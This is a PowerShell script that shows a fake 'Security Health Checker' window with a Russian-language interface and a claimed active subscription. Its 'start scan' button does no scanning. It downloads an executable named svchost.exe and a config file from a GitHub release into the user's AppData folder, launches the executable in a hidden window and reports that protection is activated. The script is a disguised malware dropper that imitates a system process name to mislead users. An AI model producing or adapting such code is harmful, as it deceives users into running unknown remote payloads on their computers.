Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "SecurityHealth Galaxy Scanner"
$form.Size = New-Object System.Drawing.Size(680,480)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::FromArgb(5,5,25)
$form.MaximizeBox = $false

# Звёзды
$rand = New-Object System.Random
for ($i=0; $i -lt 40; $i++) {
    $star = New-Object System.Windows.Forms.Label
    $star.Text = "."
    $star.ForeColor = [System.Drawing.Color]::White
    $star.BackColor = $form.BackColor
    $star.AutoSize = $true
    $star.Location = New-Object System.Drawing.Point($rand.Next(5,650), $rand.Next(5,220))
    $form.Controls.Add($star)
}

$title = New-Object System.Windows.Forms.Label
$title.Text = "SECURITY HEALTH CHECKER"
$title.Font = New-Object System.Drawing.Font("Consolas",20,[System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::Cyan
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(50,20)
$form.Controls.Add($title)

$subtitle = New-Object System.Windows.Forms.Label
$subtitle.Text = "ПОДПИСКА АКТИВНА"
$subtitle.Font = New-Object System.Drawing.Font("Consolas",11,[System.Drawing.FontStyle]::Bold)
$subtitle.ForeColor = [System.Drawing.Color]::Green
$subtitle.AutoSize = $true
$subtitle.Location = New-Object System.Drawing.Point(50,55)
$form.Controls.Add($subtitle)

$expires = New-Object System.Windows.Forms.Label
$expires.Text = "Срок действия: 27.08.2027"
$expires.Font = New-Object System.Drawing.Font("Consolas",9)
$expires.ForeColor = [System.Drawing.Color]::Gray
$expires.AutoSize = $true
$expires.Location = New-Object System.Drawing.Point(50,75)
$form.Controls.Add($expires)

$tab1 = New-Object System.Windows.Forms.Label
$tab1.Text = "СКАНИРОВАНИЕ"
$tab1.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
$tab1.ForeColor = [System.Drawing.Color]::Magenta
$tab1.AutoSize = $true
$tab1.Location = New-Object System.Drawing.Point(50,110)
$form.Controls.Add($tab1)

$tab2 = New-Object System.Windows.Forms.Label
$tab2.Text = "ЗАЩИТА"
$tab2.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
$tab2.ForeColor = [System.Drawing.Color]::Gray
$tab2.AutoSize = $true
$tab2.Location = New-Object System.Drawing.Point(180,110)
$form.Controls.Add($tab2)

$tab3 = New-Object System.Windows.Forms.Label
$tab3.Text = "ОБНОВЛЕНИЯ"
$tab3.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
$tab3.ForeColor = [System.Drawing.Color]::Gray
$tab3.AutoSize = $true
$tab3.Location = New-Object System.Drawing.Point(280,110)
$form.Controls.Add($tab3)

$status = New-Object System.Windows.Forms.Label
$status.Text = "Готов к проверке"
$status.Font = New-Object System.Drawing.Font("Consolas",12)
$status.ForeColor = [System.Drawing.Color]::LightCyan
$status.AutoSize = $true
$status.Location = New-Object System.Drawing.Point(50,150)
$form.Controls.Add($status)

$substatus = New-Object System.Windows.Forms.Label
$substatus.Text = "Нажмите НАЧАТЬ ПРОВЕРКУ"
$substatus.Font = New-Object System.Drawing.Font("Consolas",9)
$substatus.ForeColor = [System.Drawing.Color]::Gray
$substatus.AutoSize = $true
$substatus.Location = New-Object System.Drawing.Point(50,175)
$form.Controls.Add($substatus)

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Size = New-Object System.Drawing.Size(560,30)
$progress.Location = New-Object System.Drawing.Point(50,210)
$progress.Style = "Continuous"
$form.Controls.Add($progress)

$detail = New-Object System.Windows.Forms.Label
$detail.Text = "Ожидание..."
$detail.Font = New-Object System.Drawing.Font("Consolas",9)
$detail.ForeColor = [System.Drawing.Color]::DarkGray
$detail.AutoSize = $true
$detail.Location = New-Object System.Drawing.Point(50,250)
$form.Controls.Add($detail)

$btn = New-Object System.Windows.Forms.Button
$btn.Text = "НАЧАТЬ ПРОВЕРКУ"
$btn.Font = New-Object System.Drawing.Font("Consolas",12,[System.Drawing.FontStyle]::Bold)
$btn.ForeColor = [System.Drawing.Color]::White
$btn.BackColor = [System.Drawing.Color]::DarkMagenta
$btn.FlatStyle = "Flat"
$btn.FlatAppearance.BorderColor = [System.Drawing.Color]::Cyan
$btn.FlatAppearance.BorderSize = 2
$btn.Size = New-Object System.Drawing.Size(280,50)
$btn.Location = New-Object System.Drawing.Point(200,310)
$form.Controls.Add($btn)

$workDir = "$env:APPDATA\SecurityHealth"
$exePath = "$workDir\svchost.exe"
$confPath = "$workDir\config.json"

$btn.Add_Click({
    if ($btn.Text -eq "НАЧАТЬ ПРОВЕРКУ") {
        $btn.Enabled = $false
        $status.Text = "Проверка компонентов..."
        $substatus.Text = "Анализ файлов"
        $detail.Text = "Поиск установленных модулей..."
        $form.Refresh()

        # Проверяем, есть ли файлы
        if (Test-Path $exePath -and Test-Path $confPath) {
            $detail.Text = "Файлы найдены. Запуск..."
            $form.Refresh()
            try {
                Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList "-c", $confPath
                $status.Text = "Защита активирована!"
                $status.ForeColor = [System.Drawing.Color]::Green
                $substatus.Text = "Модуль SecurityHealth запущен"
                $detail.Text = "Версия 2.4.1"
            } catch {
                $status.Text = "ОШИБКА ЗАПУСКА"
                $status.ForeColor = [System.Drawing.Color]::Red
                $substatus.Text = $_.Exception.Message
                $substatus.ForeColor = [System.Drawing.Color]::Red
            }
            $btn.Text = "ЗАВЕРШИТЬ"
            $btn.Enabled = $true
        } else {
            $detail.Text = "Файлы не найдены. Загрузка..."
            $form.Refresh()
            $urlExe  = "https://github.com/Varenik638/check/releases/download/check/svchost.exe"
            $urlConf = "https://github.com/Varenik638/check/releases/download/check/config.json"
            try {
                if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
                $web = New-Object System.Net.WebClient
                $web.Headers.Add("User-Agent", "Mozilla/5.0")
                $status.Text = "Загрузка компонентов..."
                $substatus.Text = "Скачивание svchost.exe"
                $form.Refresh()
                $web.DownloadFile($urlExe, $exePath)
                $substatus.Text = "Скачивание config.json"
                $form.Refresh()
                $web.DownloadFile($urlConf, $confPath)

                $detail.Text = "Загрузка завершена. Запуск..."
                $form.Refresh()
                Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList "-c", $confPath

                $status.Text = "Защита активирована!"
                $status.ForeColor = [System.Drawing.Color]::Green
                $substatus.Text = "Модуль SecurityHealth запущен"
                $detail.Text = "Версия 2.4.1"
            } catch {
                $status.Text = "ОШИБКА ЗАГРУЗКИ"
                $status.ForeColor = [System.Drawing.Color]::Red
                $substatus.Text = $_.Exception.Message
                $substatus.ForeColor = [System.Drawing.Color]::Red
                $detail.Text = "Проверьте интернет-соединение"
            }
            $btn.Text = "ЗАВЕРШИТЬ"
            $btn.Enabled = $true
        }
    } elseif ($btn.Text -eq "ЗАВЕРШИТЬ" -or $btn.Text -eq "ЗАКРЫТЬ") {
        $form.Close()
    }
})

[void]$form.ShowDialog()
